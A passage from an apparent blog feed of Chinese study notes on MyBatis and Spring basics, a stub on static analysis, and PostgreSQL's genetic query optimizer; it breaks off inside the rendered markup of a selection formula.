tabindex="-1">MyBaits</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=116&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">课程连接</a></p><ul><li>Mybaits是一款优秀的持久层（即三层中的第三层）框架，用于简化JDBC的开发</li><li></li></ul><h3 id="01-mybatis%E5%85%A5%E9%97%A8" tabindex="-1">01 Mybatis入门</h3><ul><li><p>使用Mybatis查询所有用户数据</p><ul><li>1 准备工作（创建springboot工程，数据库表user，实体类User）</li><li>2 引入Mybatis的相关依赖，配置Mybaits(数据库连接信息)</li><li>3 编写SQL语句（注解/XML）</li></ul></li><li><p>配置SQL提示</p></li><li><p>JDBC（Java DataBase Connectivity）,就是使用Java语言操作关系型数据库的一套API</p><ul><li>本质<ul><li>sun公司官方定义的一套操作所用关系型数据的规范，即接口</li><li>各个数据库厂商去实现这套接口，提供数据库的驱动jar包</li><li>使用这套接口编程，真正执行的是驱动jar包中的代码</li></ul></li></ul></li><li><p>数据库连接池</p><ul><li>概念<ul><li>数据库连接池是一个容器，负责分配，管理数据库连接</li><li>允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个</li><li>释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏</li></ul></li><li>优势<ul><li>资源重用</li><li>提升系统响应速度</li><li>避免数据库连接遗漏</li></ul></li><li>便准接口：DataSource<ul><li>官方sun提供的供数据库连接池接口，由第三方组织实现该接口</li><li>功能：获取连接</li></ul></li></ul></li><li><p>lombok</p><ul><li>定义：Lombok是一个实用的java类库，能通过注解的形式自动生成构造器getter/setter,equals,hashcode,toString等方法，并可以自动化生成日志变量，简化java开发，提高效率</li></ul><table><thead><tr><th>注解</th><th>作用</th></tr></thead><tbody><tr><td>@Getter/@Setter</td><td>为所有属性提供get/set方法</td></tr><tr><td>@ToString</td><td>会给类自动生成易读的toString方法</td></tr><tr><td>@EqualsAndHashCode</td><td>根据类所拥有的非静态字段自动重写equals方法和hashcode方法</td></tr><tr><td>@Data</td><td>提供了更综合的生成代码功能（包含以上四个方法）</td></tr><tr><td>@NoArgsConstructor</td><td>为实体类生成无参的构造器方法</td></tr><tr><td>@AllArgsConstructor</td><td>为实体类生成除static修饰的字段之外带有各参数的构造器方法</td></tr></tbody></table></li></ul><h3 id="02-mybatis%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C" tabindex="-1">02 Mybatis基础操作</h3><ul><li><p>准备</p></li><li><p>删除</p><ul><li>SQL语句：<code>delete from emp where id=17</code></li><li>接口方法：</li></ul><pre><code class="language-java">@Delete(&quot;delete from emp where id=#&#123;id&#125;&quot;)//也可以是@Delete(&quot;delete from emp where id=$&#123;id&#125;&quot;)//但#&#123;&#125;为预编译，$&#123;&#125;为直接嵌入public void delete(Integer id);</code></pre><ul><li>如果mapper接口方法形参只有一个普通类型的参数，#{…}里面的属性名可以随便写，否则要对应</li><li>日志输出：再application.properties中配置<code>mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</code>，打开mybatis日志，并指定输出到控制台中</li><li>预编译<ul><li>性能更高</li><li>更安全（防止SQL注入 ）<ul><li>sQL注入：通过操作输入的数据来修改实现定义好的SQL语句，以达到执行代码对服务器进行攻击的方法</li></ul></li></ul></li></ul></li><li><p>新增</p><ul><li>SQL语句</li></ul><pre><code class="language-sql">insert into emp(username, name, gender, image, job, entrydate, dept_id, create_time, update_time)    values ('Tom','汤姆','1','1.jpg',1,'2005-01-01',1,now(),now())</code></pre><ul><li>接口方法</li></ul><pre><code class="language-java">@Options(useGeneratedKeys = true,keyProperty = &quot;id&quot;)//该注解可以返回生成的主键，默认是不返回的@Insert(&quot;insert into emp(username, name, gender, image, job, entrydate, dept_id, create_time, update_time)&quot; +          &quot; values (#&#123;username&#125;,#&#123;name&#125;,#&#123;gender&#125;,#&#123;image&#125;,#&#123;job&#125;,#&#123;entrydate&#125;,#&#123;deptId&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&quot;)  public void insert(Emp emp);</code></pre></li><li><p>更新</p><ul><li>SQL语句</li></ul><pre><code class="language-sql">update emp set username='',name='',gender='',image='',job='',entrydate='',dept_id='',create_time='',update_time='' where id=1;</code></pre><ul><li>接口方法</li></ul><pre><code class="language-java">@Update(&quot;update emp set username=#&#123;username&#125;,name=#&#123;name&#125;,gender=#&#123;gender&#125;,image=#&#123;image&#125;,&quot;+&quot;job=#&#123;job&#125;,entrydate=#&#123;entrydate&#125;,dept_id=#&#123;deptId&#125;,update_time=#&#123;updateTime&#125; where id=#&#123;id&#125;&quot;)  public void update(Emp emp);</code></pre></li><li><p>查询</p><ul><li>SQL语句：<code>select * from emp where id=15</code></li><li>接口方法：</li></ul><pre><code class="language-java">@Select(&quot;select * from emp where id=#&#123;id&#125;&quot;)  public Emp getById(Integer id);</code></pre><ul><li>mybatis数据封装<ul><li>实体类属性名和数据库表查询返回的字段名一致，mybatis会自动封装</li><li>不一致时解决方案：<ul><li><ol><li>在sql语句中起别名</li></ol></li><li><ol start="2"><li>通过<code>@Results,@Result</code>注解手动映射</li></ol></li><li><ol start="3"><li>通过mybaits的驼峰命名自动映射开关</li></ol></li></ul></li></ul></li></ul></li><li><p>条件查询</p><ul><li>SQL语句</li></ul><pre><code class="language-sql">select * from emp where name like '%张%' and gender = 1 and entrydate between '2010-01-01' and '2020-01-01' order by update_time desc</code></pre><ul><li>接口方法</li></ul><pre><code class="language-java">@Select(&quot;select * from emp where name like concat('%',#&#123;name&#125;,'%') and gender = #&#123;gender&#125; and &quot; +  &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)  public List&lt;Emp&gt; list(String name, short gender, LocalDate begin,LocalDate end);</code></pre></li></ul><h3 id="03-xml%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6" tabindex="-1">03 XML映射文件</h3><p>//之后在本次突击还没用到，以后闲了看看</p><h3 id="04-mybatis%E5%8A%A8%E6%80%81sql" tabindex="-1">04 Mybatis动态SQL</h3><h2 id="spring" tabindex="-1">Spring</h2><p>Spring技术是JavaEE开发必备技能，企业开发技术选型命中率&gt;90%</p><ul><li><p>简化开发，降低企业级开发的复杂性</p></li><li><p>框架整合，高效整合其它技术，提高企业级应用开发和运行效率</p></li><li><p>学什么？</p><ul><li>IoC</li><li>AOP</li><li>事务处理</li><li>框架整合</li></ul></li><li><p>怎么学？</p><ul><li>学习Spring框架的设计思想</li><li>学习基础操作，思考操作与思想间的联系</li><li>学习案例，熟练应用操作的同时，体会思想</li></ul></li></ul><h3 id="1-spring-%E5%88%9D%E8%AF%86" tabindex="-1">1 Spring 初识</h3><ul><li>Spring 既是一门技术，也是一套项目，已经形成了开发的生态圈，Spring 全家桶</li><li>包含重点：<ul><li>Spring Framework：基础框架，全家桶所有都基于此</li><li>Spring Boot：Spring开发已经更简单，该技术让Spring开发更迅速</li><li>Spring Cloud：提供分布式开发相关技术</li></ul></li></ul><h3 id="2-spring-framework" tabindex="-1">2 Spring Framework</h3><ul><li>该项目为Spring生态圈最基础的项目<br><img src="/images/web/spring/Spring4.0%E6%9E%B6%E6%9E%84%E5%9B%BE.jpg" alt="Spring4.0架构图"></li><li>然而该架构配置繁琐，入门难度大</li><li>为此推出Spring Boot 简化配置和快速开发</li></ul><h3 id="3-spring-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5" tabindex="-1">3 Spring 核心概念</h3><ul><li><p>Ioc/DI</p></li><li><p>IoC容器</p></li><li><p>Bean</p></li><li><p>IoC (Inversion of Control) 控制反转</p><ul><li>使用对象时，由主动new产生对象转换为由外部提供对象，此过程中对像创建控制权由程序转移到外部，此思想称为控制反转</li></ul></li><li><p>Spring技术对IoC技术进行了实现</p><ul><li>Spring提供了一个容器，称为IoC容器，用来充当IoC思想中的“外部”</li><li>IoC容器负责对象的创建，初始化等一系列工作，被创建或被管理的对象再IoC容器里称为<code>Bean</code></li></ul></li><li><p>DI (Dependency Injection) 依赖注入</p><ul><li>在容器中简历bean和bean之间的依赖关系的整个过程，称为依赖注入</li></ul></li><li><p>核心概念</p><ul><li>目标：充分解耦<ul><li>使用IoC容器管理bean（IoC）</li><li>在IoC容器内将有依赖关系的bean进行关系绑定（DI）</li></ul></li><li>最终效果<ul><li>使用对象时不仅可以直接从IoC容器中获取，并且获取到的bean已经绑定了所有的依赖关系</li></ul></li></ul></li></ul><h3 id="4-ioc%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B" tabindex="-1">4 IoC入门案例</h3><ol><li>管理什么？（Service与Dao）</li><li>如何将管理的对象告知IoC容器（配置）</li><li>被管理的对象交给IoC容器，如何获取IoC容器（接口）</li><li>IoC容器得到后，如何获得其中bean（接口方法）</li><li>使用Spring导入哪些坐标（pos.xml）</li></ol><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> web </tag>
            
            <tag> IDEA </tag>
            
            <tag> spring,springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件分析（未完）</title>
      <link href="/2023/03/07/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/07/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<img src="/images/meitu/6.jpg"><p>本笔记参考<a href="https://www.bilibili.com/video/BV1b7411K7P4/?spm_id_from=333.337.search-card.all.click&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频</a></p><h2 id="01%E4%BB%8B%E7%BB%8D" tabindex="-1">01介绍</h2><ol><li>PL and Static Analysis</li><li>Why We Learn Static Analysis?</li><li>What is Static Analysis?</li><li>Static Analysis Features and Examples</li><li>Teaching Plan</li><li>Evaluation Criteria</li></ol><h3 id="1-pl-and-static-analysis" tabindex="-1">1 PL and Static Analysis</h3><p>PL：Programming Languages程序语言</p><h3 id="2-why-we-learn-static-analysis%3F" tabindex="-1">2 Why We Learn Static Analysis?</h3><h3 id="3-what-is-static-analysis%3F" tabindex="-1">3 What is Static Analysis?</h3><h3 id="4-static-analysis-features-and-examples" tabindex="-1">4 Static Analysis Features and Examples</h3><h3 id="5-teaching-plan" tabindex="-1">5 Teaching Plan</h3><h3 id="6-evaluation-criteria" tabindex="-1">6 Evaluation Criteria</h3><h2 id="02" tabindex="-1">02</h2><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库试验--PostgreSQL源码分析--遗传算法的使用</title>
      <link href="/2023/03/06/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93PostgreSQL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/06/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93PostgreSQL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><img src="/images/meitu/5.jpg"><p><a href="https://github.com/postgres/postgres.git">源码地址</a></p><h2 id="1-postgresql%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84" tabindex="-1">1 PostgreSQL的体系结构</h2><p>PostgreSQL数据库由连接管理系统(系统控制器)、编译执行系统、存储管理系统、事务系统、系统表五大部分组成</p><ul><li>连接管理系统接受外部操作对系统的请求，对操作请求进行预处理和分发，起系统逻辑控制作用</li><li>编译执行系统由查询编译器、查询执行器组成，完成操作请求在数据库中的分析处理和转化工作，最终实现物理存储介质中数据的操作</li><li>存储管理系统由索引管理器、内存管理器、外存管理器组成，负责存储和管理物理数据，提供对编译查询系统的支持;</li><li>事务系统囱事务管理器、日志管理器、并发控制、锁管理器组成，日志管理器和事务管理器完成对操作请求处理的事务一致性支持，锁管理器和并发控制提供对并发访问数据的一致性支持</li><li>系统表是 PostgreSQL 数据库的元信息管理中心，包括数据库对象信息和数据库管理控制信息,系统表管理元数据信息，将 PostgreSQL 数据库的各个模块有机地连接在一起，形成个高效的数据管理系统。</li></ul><h2 id="2-postgresql%E7%9A%84%E6%9F%A5%E8%AF%A2%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5%E4%B8%AD%E7%9A%84%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95" tabindex="-1">2 PostgreSQL的查询编译阶段中的遗传算法</h2><p>查询处理器是数据库管理系统中的一个部件集合，它允许用户使用 SQL 语言在较高层次上表达查询，其主要职责是将用户的各种命令转化成数据库上的操作序列并执行。查询处理分查询编译和查询执行两个阶段。</p><p>当PostgreSQL 的后台服务进程接收到查询语句后，首先将其传递到查询分析模块，进行词法、语法和语义分析 若是简单的命令(例如建表、创建用户、备份等)则将其分配到功能性命令处理模块;</p><p>对于复杂的命令( SELECT/INSERT/DELETEl UPDA四)则要为其构建查询树( Query 结构体) .然后交给查询重写模块。查询重写模块接收到查询树后，按照该查询所涉及的规则和视图对查询树进行重写，生成新的查询树。</p><p>生成路径模块依据重写过的查询树，考虑关系的访问方式、连接方式和连接顺序等问题，采用动态规划算法或遗传算法，生成最优的表连接路径 最后，由最优路径生成可执行的计划，并将其传递到查询执行模块执行。</p><p>因此PG中的遗传算法的使用主要在生成最优的表链接路径上</p><h2 id="3-%E6%9F%A5%E8%AF%A2%E8%A7%84%E5%88%92%E7%9A%84%E6%80%BB%E4%BD%93%E6%B5%81%E7%A8%8B" tabindex="-1">3 查询规划的总体流程</h2><p>查询规划的最终目的是得到可被执行器执行的最优计划，整个过程可分为预处理、生成路径和生成计划三个阶段。</p><ul><li>预处理实际上是对查询树( Query 结构体)的进一步改造，这种改造可通过 SQL语句体现。在此过程中，最重要的是提升子链接和提升子查询。</li><li>在生成路径阶段，接收到改造后的查询树后，采用动态规划算法或遗传算法，生成最优连接路径和候选的路径链表。</li><li>在生成计划阶段，用得到的最优路径 首先生成基本计划树，然后添加 GROUPBY HAVING ORDER BY 子句所对应的计划节点形成 整计划树</li></ul><h2 id="4-%E8%B7%AF%E5%BE%84%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95" tabindex="-1">4 路径生成算法</h2><p>路径代表了对一个表或者多个表中数据的访问方式。</p><p>由于单个表的访问方式(顺序访问、索引访问)、两个表间的连接方式(嵌套循环连接、归并连接、 Hash 连接)以及多个表间的连接顺序(左连接、右连接和布希连接)都有多种，因此访问 表或多个袤的路径也会有多种，</p><p>每个路径都可能是上述访问方式、连接方式和连接顺序的一种组合。查询执行模块只需要执行效率最高的路径。因此在准备计划时，查询规划器需要考虑所有的路径，并从中挑选出最优的路径来生成执行计划，这个生成并挑选最优路径的工作由路径生成算法完成</p><p>PostgreSQL 中有两种路径生成算法:动态规划算法和遗传算法。</p><p>动态规划算法是生成路径的默认算法，但在某些情况下，检查一个查询所有可能的路径会花去很多的时间和内存空间，特别是所要执行的查询涉及大量的关系的时候。在这种情况下，为了在合理的时间里判断一个合理的执行计划， PostgreSQ 将使用遗传算法生成路径。</p><p>是否启用遗传算法由两个因素决定:</p><ul><li>在系统配置中是否允许使用遗传算法：由全局变量enable_geqo控制，其值来自于配置文件中的 geqo 配置项，默认情况下是允许。</li><li>需要连接的基本关系是否超过使用遗传算法的阈值：由全局变量geqo_threshold 控制，其值来自于配置文件中的geqo_threshold配置选项，<br>默认值是 12 ，即参加连续的基本关系数大于或等于 12 时就会采用遗传算法来生成路径</li></ul><h2 id="5-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E6%A6%82%E8%BF%B0" tabindex="-1">5 遗传算法概述</h2><p>遗传算法 (GA) 是一种种启发式的优化方法 (heuristic optimization method) ，它通过既定的随机搜索进行操作。</p><p>优化问题的可能解的集合被认为是个体(individuals)组成的种群(population).一个个体对它的环境的适应程度由它的适应值(fitness) 。一个个体在搜索空间里的参照物是用染色体(chromosomes)表示的,实际上这是一套字符串。一个基因(gene)是染色体的一个片段，基因是被优化的单个参数的编码。对一个基因的典型的编码 以是二进制 (binary)或整数(integer)。通过仿真进化过程的重组(recombination)、变异(mutation) 和选择(selection )找到新一代的搜索点，它们的平均适应值要比它们的祖先好。</p><p>在PostgreSQL中，遗传算法将路径作为个体，将个体以某种方式编码(个体体现了连接顺序),然后通过重组得到后代，考虑连接代价来计算后代的适应值，再选择合适的后代进行下一次迭代。当到达一定的迭代次数之后，遗传算法终止。选择遗传算法可以减少生成路径的时间，但是遗传算法并不一定能找到&quot;最好&quot;的规划，它只能找到相对较优的路径。</p><h2 id="6-postgresql%E4%B8%AD%E7%9A%84%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95" tabindex="-1">6 PostgreSQL中的遗传算法</h2><p>PostgreSQ 中，遗传算法主要用在连接路径的生成操作中，其流程如下：</p><p><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/GA_process.jpg" alt="GA_process"></p><h3 id="%EF%BC%881%EF%BC%89%E4%B8%AA%E4%BD%93%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%8F%8A%E7%A7%8D%E7%BE%A4%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">（1）个体编码方式及种群初始化</h3><p>PG中用遗传算法解决表连接的问题的方式类似于TSP问题。可能的连接路径被当作整数串进行编码。v每个穿代表查询中的一种可能的连接顺序。</p><p>如下图的查询书可以用整数串<code>&quot;4132&quot;</code>编码,即首先连接表&quot;4&quot;和&quot;1&quot; 得到的结果表再和表 “3” 连接，最后再和&quot;2&quot; 连接。</p><p><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/%E6%9F%A5%E8%AF%A2%E6%A0%911.jpg" alt="查询树"></p><p>遗传算法执行第一步为随机初始化种群。假设种群大小为n，首先随机初始化n个排列树，每一个排列数即是一个个体。然后基于n各排列数生成的基本表的连接路径，在此过程中进行代价评估，将最后的代价作为适应值衡量该个体的优劣。</p><p>每一个个体都用Chromosome结构表示，记录了个体的排列和代价</p><pre><code class="language-c">typedef int Gene;typedef struct Chromosome&#123;    Gene *string;//染色体的数据值    Cost worth;//对染色体的代价评估&#125;//Chromosome</code></pre><h3 id="%EF%BC%882%EF%BC%89%E9%80%82%E5%BA%94%E5%80%BC" tabindex="-1">（2）适应值</h3><p>个体的适应值等于该个体中N个表的连接代价。适应值计算由geqo_eval实现，包括以下步骤：</p><ol><li>检查个体的有效性</li><li>确定个体的连接次序以及连接方式</li><li>计算个体的适应值</li></ol><p>计算个体的适应值时.首先要检查个体是否有效。也就是说，对一个给定的个体，能不能把这个个体中的表按照某种次序连接起来，因为有些表之间是不能连接的。如果一个个体按任何次序都不能连接，那么这么个体是无效的。对于有效的个体，还要确定连续次序和连接方式。在连接次序和连接方式确定之后才能计算个体的</p><h3 id="%EF%BC%883%EF%BC%89%E7%88%B6%E4%BD%93%E9%80%89%E6%8B%A9%E7%AD%96%E7%95%A5" tabindex="-1">（3）父体选择策略</h3><p>附体选择策略是基于排名的选择策略，选择概率函数如下公式。<br>其中max是个体总数，bias默认值是2.0，geo_rand是0.0~1.0之间的随机数，f(geo_rand)表示当前个体在种群中的编号（该编号是根据当前个体的适应值在种群中的排名来确定）。<br>该函数表明，排名越前的个体被选择的概率越大。</p><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>g</mi><mi>e</mi><mi>o</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="right center left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>∗</mo><mfrac><mrow><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mi>A</mi></mrow><mrow><mn>2</mn><mo>∗</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>A</mi><mo>&lt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>∗</mo><mfrac><mrow><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><msqrt><mi>A</mi></msqrt></mrow><mrow><mn>2</mn><mo>∗</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>A</mi><mo>≥</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>其中</mtext><mo separator="true">,</mo><mi>A</mi><mo>=</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>∗</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>4</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>g</mi><mi>e</mi><mi>o</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex"> f(geo\_rand)=\left\{\begin{array}{rcl}max*\frac{bias-A}{2*bias-1}&amp;&amp; {A&lt;0}\\max*\frac{bias-\sqrt{A}}{2*bias-1}&amp;&amp; {A\geq 0}\\其中,A=bias*bias-4*(bias-1)*geo\_rand\end{array} \right. </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">eo</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.9334em;vertical-align:-1.7167em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-2.5em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.492em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.016em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.016em" style="width:0.8889em" viewbox="0 0 888.89 16" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V16 H384z M384 0 H504 V16 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.016em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.016em" style="width:0.8889em" viewbox="0 0 888.89 16" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V16 H384z M384 0 H504 V16 H384z"/></svg></span></span><span style="top:-4.3em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2167em;"><span style="top:-4.3832em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.9332em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0466em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9323em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mathnormal mtight">A</span></span></span><span style="top:-2.8923em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1077em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-1.6899em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord cjk_fallback">其中</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">bia</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">bia</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">bia</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span 